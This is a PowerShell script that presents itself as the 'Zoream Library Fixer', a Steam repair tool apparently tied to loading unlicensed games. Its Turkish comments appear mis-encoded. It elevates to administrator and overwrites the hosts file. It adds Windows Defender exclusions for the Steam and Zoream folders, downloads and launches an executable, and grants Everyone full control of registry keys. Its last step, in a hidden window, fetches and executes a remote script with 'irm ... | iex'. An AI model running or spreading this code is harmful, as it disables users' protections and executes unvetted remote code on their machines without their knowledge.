[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
Try {
    $MethodDefinition = @'
    [DllImport("kernel32.dll")]
    public static extern bool SetConsoleMode(IntPtr hConsoleHandle, uint dwMode);
    [DllImport("kernel32.dll")]
    public static extern bool GetConsoleMode(IntPtr hConsoleHandle, out uint lpMode);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetStdHandle(int nStdHandle);
'@
    $Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name "Kernel32Functions" -Namespace Win32 -PassThru
}
catch {}

function Disable-QuickEdit {
    $hInput = $Kernel32::GetStdHandle(-10)
    $mode = 0
    if ($Kernel32::GetConsoleMode($hInput, [ref]$mode)) {
        $mode = $mode -band -not (0x0040 -bor 0x0020)
        $Kernel32::SetConsoleMode($hInput, $mode -bor 0x0080)
    }
}

Disable-QuickEdit
$host.UI.RawUI.BackgroundColor = "Black"
$host.UI.RawUI.ForegroundColor = "White"
$host.UI.RawUI.WindowTitle = "Zoream Library Fixer | Nexora Development"
Clear-Host

$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identity)
$isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "`n [!] Requesting Administrative Privileges..." -ForegroundColor Yellow
    if ($PSCommandPath) { $scriptPath = $PSCommandPath } else {
        $scriptPath = Join-Path $env:TEMP "zoream_fix.ps1"
        $scriptText = $MyInvocation.MyCommand.ScriptBlock.ToString()
        Set-Content -Path $scriptPath -Value $scriptText -Encoding UTF8
    }
    Start-Process -FilePath "conhost.exe" -Verb RunAs -ArgumentList "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
    exit
}

Disable-QuickEdit

function Show-Header {
    Write-Host " "
    Write-Host "  ______                                              " -ForegroundColor Cyan
    Write-Host " |__  /   ___   _ __    ___    __ _   _ __ ___        " -ForegroundColor Cyan
    Write-Host "   / /   / _ \ | '__|  / _ \  / _`` | | '_ `` _ \       " -ForegroundColor DarkCyan
    Write-Host "  / /_  | (_) || |    |  __/ | (_| | | | | | | |      " -ForegroundColor Blue
    Write-Host " /____|  \___/ |_|     \___|  \__,_| |_| |_| |_|      " -ForegroundColor Blue
    Write-Host " "
    Write-Host "   ----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "              Zoream By Nexora Development             " -ForegroundColor White
    Write-Host "   ----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host " "
}

function Write-Log {
    param([string]$Message, [string]$Type = "INFO")
    $Time = Get-Date -Format "HH:mm:ss"
    switch ($Type) {
        "INFO" { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [?] $Message" -ForegroundColor Gray }
        "SUCCESS" { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [OK] $Message" -ForegroundColor Green }
        "WARN" { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [!] $Message" -ForegroundColor Yellow }
        "ERROR" { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [X] $Message" -ForegroundColor Red }
        "STEP" { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [>] $Message" -ForegroundColor Cyan }
    }
}

Clear-Host
Show-Header
Write-Log "Anti-Freeze (QuickEdit Disabled) applied successfully." "SUCCESS"



$ErrorActionPreference = "SilentlyContinue"
$hostsPath = "$env:SystemRoot\System32\drivers\etc\hosts"

# Tutulacak (Ä°zin verilen) giriÅler
$allowedEntries = @(
    "127.0.0.1 steam.run",
    "::1 steam.run",
    "127.0.0.1 api.paradisedev.org",
    "127.0.0.1 api2.paradisedev.org",
    "::1 api.paradisedev.org",
    "::1 api2.paradisedev.org",
    "127.0.0.1 paradisedev.org",
    "::1 paradisedev.org"
)

try {
    # 1. Mevcut dosyayÄ± oku, yorum satÄ±rlarÄ±nÄ± (#) koru ama diÄer yÃ¶nlendirmeleri temizle
    $oldContent = Get-Content $hostsPath
    $newContent = New-Object System.Collections.Generic.List[string]

    foreach ($line in $oldContent) {
        # Yorum satÄ±rlarÄ±nÄ± veya boÅ satÄ±rlarÄ± olduÄu gibi bÄ±rak (Sistem saÄlÄ±ÄÄ± iÃ§in)
        if ($line.Trim().StartsWith("#") -or [string]::IsNullOrWhiteSpace($line)) {
            $newContent.Add($line)
        }
    }

    # 2. Sadece senin istediÄin 2 ana domain ve local IP'lerini ekle
    foreach ($entry in $allowedEntries) {
        $newContent.Add($entry)
    }

    # 3. DosyayÄ± Ã¼zerine yaz
    $newContent | Set-Content $hostsPath -Force

    # 4. DNS ÃnbelleÄini temizle
    ipconfig /flushdns | Out-Null

}
catch {

  }


# Find Steam
try { $steamPath = (Get-ItemProperty "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam").InstallPath } catch { $steamPath = $null }
if (-not $steamPath) { Write-Log "Steam not found!" "ERROR"; exit 1 }

$zoreamPath = Join-Path $env:LOCALAPPDATA "Zoream"
$zoreamExe = Join-Path $zoreamPath "Zoream.exe"

# -------------------------------------------------------------------------
# ZOREAM CHECK & DOWNLOAD MODULE
# -------------------------------------------------------------------------
if (-not (Test-Path $zoreamExe)) {
    Write-Log "Zoream component missing. Initiating download..." "WARN"

    $downloadUrl = "https://github.com/WolfGames156/zoreamrelease/releases/download/release/Zoream_Setup.exe"
    $tempSetup = Join-Path $env:TEMP "Zoream_Setup.exe"

    try {
        # .NET WebRequest kullanarak Timeout kontrolÃ¼ ve Progress Bar
        $request = [System.Net.WebRequest]::Create($downloadUrl)
        $request.Timeout = 5000 # 5 Saniye Timeout
        $response = $request.GetResponse()

        $totalLength = $response.ContentLength
        $responseStream = $response.GetResponseStream()
        $targetStream = [System.IO.File]::Create($tempSetup)
        $buffer = New-Object byte[] 10KB
        $readCount = 0

        do {
            $count = $responseStream.Read($buffer, 0, $buffer.Length)
            $targetStream.Write($buffer, 0, $count)
            $readCount += $count
            if ($totalLength -gt 0) {
                $pct = [Math]::Floor(($readCount / $totalLength) * 100)
                Write-Progress -Activity "Downloading Zoream Installer" -Status "Progress: $pct%" -PercentComplete $pct
            }
        } while ($count -gt 0)

        $targetStream.Close()
        $responseStream.Close()
        $response.Close()

        Write-Progress -Activity "Downloading Zoream Installer" -Completed
        Write-Log "Zoream Setup downloaded successfully." "SUCCESS"

        # AyrÄ± bir iÅlem olarak aÃ§ (PowerShell'i bekletmesin)
        Start-Process -FilePath $tempSetup -WindowStyle Normal
    }
    catch {
        # Hata olursa veya 5 saniye timeout yerse hiÃ§bir Åey yapma, devam et.
        # Ä°leride hata yazdÄ±rmÄ±yoruz.
    }
}
# -------------------------------------------------------------------------

Write-Log "Applying Windows Defender exclusion for Zoream folder..." "STEP"

if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
    try {
        # KlasÃ¶r fiziksel olarak oluÅmamÄ±Å olsa bile exclusion eklemek mantÄ±klÄ±dÄ±r (kurulum Ã¶ncesi)
        # Ancak orijinal kodda Test-Path kontrolÃ¼ vardÄ±, burada hata almamak iÃ§in
        # EÄer kurulum yeni indiyse klasÃ¶r henÃ¼z oluÅmamÄ±Å olabilir.
        if (-not (Test-Path $zoreamPath)) {
            New-Item -ItemType Directory -Path $zoreamPath -Force | Out-Null
        }

        $existing = (Get-MpPreference -ErrorAction Stop).ExclusionPath

        if ($existing -and $existing -contains $zoreamPath) {
            Write-Log "Zoream folder already excluded." "SUCCESS"
        }
        else {
            Add-MpPreference -ExclusionPath $zoreamPath -ErrorAction Stop
            Write-Log "Zoream folder excluded successfully." "SUCCESS"
        }
    }
    catch {
        Write-Log "Failed to apply Defender exclusion. (If it does not apply automatically, you may add it manually.)" "ERROR"
    }
}
else {
    Write-Log "Windows Defender cmdlets not available. (If it does not apply automatically, you may add it manually.)" "ERROR"
}

Write-Log "Applying Windows Defender exclusion for Steam Folder..." "STEP"

if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
    try {
        $existing = (Get-MpPreference -ErrorAction Stop).ExclusionPath

        if ($existing -and $existing -contains $steamPath) {
            Write-Log "Steam folder already excluded." "SUCCESS"
        }
        else {
            Add-MpPreference -ExclusionPath $steamPath -ErrorAction Stop
            Write-Log "Steam folder excluded successfully." "SUCCESS"
        }
    }
    catch {
        Write-Log "Failed to apply Defender exclusion. (If it does not apply automatically, you may add it manually.)" "ERROR"
    }
}
else {
    Write-Log "Failed to apply Defender exclusion. (If it does not apply automatically, you may add it manually.)" "ERROR"
}







Write-Log "Clearing Beta and Killing Processes..." "STEP"
Start-Process (Join-Path $steamPath "Steam.exe") -ArgumentList "-clearbeta"
Start-Sleep -Seconds 5
Get-Process steam* -ErrorAction SilentlyContinue | Stop-Process -Force

$backupPath = Join-Path $steamPath "cache-backup"
New-Item -ItemType Directory -Path $backupPath -Force | Out-Null

$appcachePath = Join-Path $steamPath "appcache"

if (Test-Path $appcachePath) {
    Write-Log "Cleaning AppCache (including stats)..." "STEP"

    # Eskiden stats'Ä± hariÃ§ tutan filtreyi kaldÄ±rdÄ±m, artÄ±k her Åeyi backup'a taÅÄ±yor/siliyor
    Get-ChildItem $appcachePath -Force | ForEach-Object {
        $target = Join-Path $backupPath $_.Name
        Move-Item $_.FullName $target -Force -ErrorAction SilentlyContinue
    }
}

# --- Ek Temizlik KÄ±smÄ± ---
Write-Log "Cleaning Steam Beta and Tencent leftovers..." "STEP"

# Steam Beta klasÃ¶rÃ¼nÃ¼ kÃ¶kten temizle
$steamBetaPath = Join-Path $steamPath "package\beta"
if (Test-Path $steamBetaPath) {
    Remove-Item $steamBetaPath -Recurse -Force -ErrorAction SilentlyContinue
    Write-Log "Steam Beta folder removed." "SUCCESS"
}

# Tencent kalÄ±ntÄ±larÄ±nÄ± kÃ¶kten temizle
$tencentPath = Join-Path $env:LOCALAPPDATA "Microsoft\Tencent"
if (Test-Path $tencentPath) {
    Remove-Item $tencentPath -Recurse -Force -ErrorAction SilentlyContinue
    Write-Log "Tencent cache folder removed." "SUCCESS"
}



Write-Log "Deleting Steamtools..." "STEP"

$pathsToTry = @(
    "HKCU:\Software\Valve\Steamtools",
    "HKLM:\Software\Valve\Steamtools"
)

$setAclUrl = "https://github.com/WolfGames156/Zoream-Database/releases/download/SetACL/SetACL.exe"
$setAclPath = Join-Path $env:TEMP "SetACL.exe"

function Ensure-SetACL {
    if (Test-Path $setAclPath) { return $true }
    try {
        Write-Log "SetACL.exe not found. Downloading..." "STEP"
        Invoke-WebRequest -Uri $setAclUrl -OutFile $setAclPath -UseBasicParsing -ErrorAction Stop *> $null
        return (Test-Path $setAclPath)
    }
    catch {
        Write-Log "SetACL.exe download failed." "ERROR"
        return $false
    }
}

function Remove-SteamToolsKey {
    param([string]$regPath)
    try {
        if (Test-Path $regPath) {
            # Recurse ve Force ile her Åeyi silmeye Ã§alÄ±Å
            Remove-Item -Path $regPath -Recurse -Force -ErrorAction Stop
            Write-Log "Path $regPath deleted successfully." "SUCCESS"
            return $true
        } else {
            Write-Log "Path $regPath does not exist, skipping." "SUCCESS"
            return $true
        }
    }
    catch {
        return $false
    }
}

function Fix-Permissions-And-Delete {
    param([string]$regPath)

    if (-not (Ensure-SetACL)) { return $false }

    # SetACL iÃ§in path formatÄ±nÄ± dÃ¼zenle (HKCU:\ -> HKCU\)
    $nativePath = $regPath.Replace(":\", "\")

    try {
        Write-Log "Resetting permissions to force delete..." "STEP"

        # 1) SahipliÄi al (Owner -> Current User)
        # -rec yes kullanarak SADECE ana klasÃ¶rÃ¼ deÄil, TÃM alt anahtarlarÄ± da zorla Ã¼zerine alÄ±yoruz.
        & $setAclPath -on $nativePath -ot reg -actn setowner -ownr "n:$env:USERNAME" -rec yes *> $null

        # 2) Ãstten gelen izin mirasÄ±nÄ± (Inheritance) kÄ±r ve eski izinlerin tamamÄ±nÄ± temizle
        & $setAclPath -on $nativePath -ot reg -actn setprot -op "dacl:p_nc;sacl:p_nc" -rec yes *> $null
        & $setAclPath -on $nativePath -ot reg -actn clearace -rec yes *> $null

        # 3) Mevcut kullanÄ±cÄ±ya ve "Everyone" grubuna (Dil sorunu olmasÄ±n diye S-1-1-0 SID'si ile) Full Control (Tam Denetim) ver
        & $setAclPath -on $nativePath -ot reg -actn ace -ace "n:S-1-1-0;p:full" -rec yes *> $null
        & $setAclPath -on $nativePath -ot reg -actn ace -ace "n:$env:USERNAME;p:full" -rec yes *> $null

        Write-Log "Permissions completely overridden (Everyone: Full). Retrying deletion..." "SUCCESS"

        # Tekrar silmeyi dene
        return (Remove-SteamToolsKey -regPath $regPath)
    }
    catch {
        Write-Log "SetACL permission fix failed." "ERROR"
        return $false
    }
}

# ÃalÄ±ÅtÄ±rma DÃ¶ngÃ¼sÃ¼
foreach ($path in $pathsToTry) {
    if (-not (Remove-SteamToolsKey -regPath $path)) {
        Fix-Permissions-And-Delete -regPath $path
    }
}




Write-Log "Configuring gamesdata" "STEP"

$steamConfigPath = Join-Path $steamPath "config"
$stpluginPath = Join-Path $steamConfigPath "stplug-in"
$gamesDataPath = Join-Path $env:APPDATA "Zoream\gamesdata"

# Hedef gamesdata klasÃ¶rÃ¼ yoksa oluÅtur
if (-not (Test-Path $gamesDataPath)) {
    New-Item -ItemType Directory -Path $gamesDataPath -Force | Out-Null
}

if (Test-Path $stpluginPath) {
    # Ãnce Ã¶znitelikleri kaldÄ±r (gÃ¶rÃ¼nÃ¼r kÄ±l)
    attrib -s -h "$stpluginPath\*" /S /D /L

    $item = Get-Item $stpluginPath

    # EÄer klasÃ¶r bir link deÄilse veya link ama yanlÄ±Å yere gidiyorsa
    if (-not $item.Attributes.HasFlag([System.IO.FileAttributes]::ReparsePoint)) {

        Get-ChildItem $stpluginPath -Force | ForEach-Object {
            $dest = Join-Path $gamesDataPath $_.Name
            # Dosya zaten varsa Ã¼zerine yaz
            Move-Item $_.FullName -Destination $dest -Force
        }

        # Orijinal klasÃ¶rÃ¼ sil
        Remove-Item $stpluginPath -Recurse -Force

        # Sembolik linki oluÅtur (Junction)
        New-Item -ItemType Junction -Path $stpluginPath -Target $gamesDataPath | Out-Null
        attrib -s -h "$stpluginPath\*" /S /D /L


    }

}
else {

    New-Item -ItemType Junction -Path $stpluginPath -Target $gamesDataPath | Out-Null
    attrib -s -h "$stpluginPath\*" /S /D /L

}







Write-Log "Validating and Cleaning gamesdata folder..." "STEP"

# Yeni dosya yolu tanÄ±mÄ± (%appdata%\Zoream\gamesdata)
$zoreamAppData = Join-Path $env:APPDATA "Zoream"
$stpluginPath = Join-Path $zoreamAppData "gamesdata"

# --- EKLENEN KISIM: Gizli ve Sistem dosyalarÄ±nÄ± gÃ¶rÃ¼nÃ¼r yap ---
if (Test-Path $stpluginPath) {
    Write-Log "Unlocking hidden/system files in gamesdata..." "STEP"
    # /S: Alt klasÃ¶rler, /D: KlasÃ¶rlerin kendisi, -s: Sistem Ã¶zniteliÄini kaldÄ±r, -h: Gizli Ã¶zniteliÄini kaldÄ±r
    attrib -s -h "$stpluginPath\*" /S /D
}
# -----------------------------------------------------------

# KlasÃ¶r yoksa oluÅtur

# .zor uzantÄ±lÄ± dosyalarÄ± bul ve .lua'ya Ã§evir
Get-ChildItem $stpluginPath -Filter *.zor -File -Force | ForEach-Object { # -Force eklendi
    $newName = [System.IO.Path]::ChangeExtension($_.FullName, ".lua")
    Write-Log "Converting $($_.Name) -> $(Split-Path $newName -Leaf)" "STEP"
    Rename-Item $_.FullName $newName -Force
}

# GeÃ§ersiz dosyalarÄ± temizle (Sadece .lua ve .zor kalsÄ±n)
Get-ChildItem $stpluginPath -File -Force | ForEach-Object { # -Force eklendi
    if ($_.Extension -notin @(".lua", ".zor")) {
        Write-Log "Removing invalid file type: $($_.Name)" "ERROR"
        Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
    }
}


# Ä°Ã§erik doÄrulama fonksiyonu (Aynen korundu)
function Test-ValidLuaLine {
    param([string]$Line)
    $trimmed = $Line.Trim()
    if ([string]::IsNullOrWhiteSpace($trimmed)) { return $true }
    if ($trimmed.StartsWith('-')) { return $true }
    if ($trimmed -match '^(?i)(addappid|setManifestid|addtoken)') {
        if ($trimmed -match '\(' -and $trimmed -match '\)') {
            return $true
        }
    }
    return $false
}

# Dosya iÃ§eriÄini kontrol et ve temizle
Get-ChildItem $stpluginPath -File | Where-Object {
    $_.Extension -in @(".lua", ".zor")
} | ForEach-Object {
    $lines = Get-Content $_.FullName
    $isClean = $true

    foreach ($l in $lines) {
        if (-not (Test-ValidLuaLine $l)) {
            $isClean = $false
            break
        }
    }

    if ($isClean) {
        Write-Log "Validated: $($_.Name)" "SUCCESS"
    }
    else {
        Write-Log "Invalid content detected! Deleting: $($_.Name)" "ERROR"
        Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
    }
}

Write-Log "Checking for steam.cfg..." "STEP"
$cfgFiles = @("steam.cfg", "Steam.cfg")
foreach ($cfg in $cfgFiles) {
    $targetCfg = Join-Path $steamPath $cfg
    if (Test-Path $targetCfg) {
        Remove-Item $targetCfg -Force -ErrorAction SilentlyContinue
        Write-Log "Deleted: $cfg" "SUCCESS"
    }
}

Write-Log "Fix and Cleanup complete." "SUCCESS"
Write-Host " "
Write-Host "   *** CORE EXECUTING IN BACKGROUND ***" -ForegroundColor Cyan
Write-Host " "

$command = "irm https://zdb2.pages.dev/dll.ps1 | iex"
Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command $command" -WindowStyle Hidden

for ($i = 10; $i -gt 0; $i--) {
    Write-Host "`r   *** This window will close in $i second(s) ***  " -ForegroundColor Magenta -NoNewline
    Start-Sleep -Seconds 1
}

exit
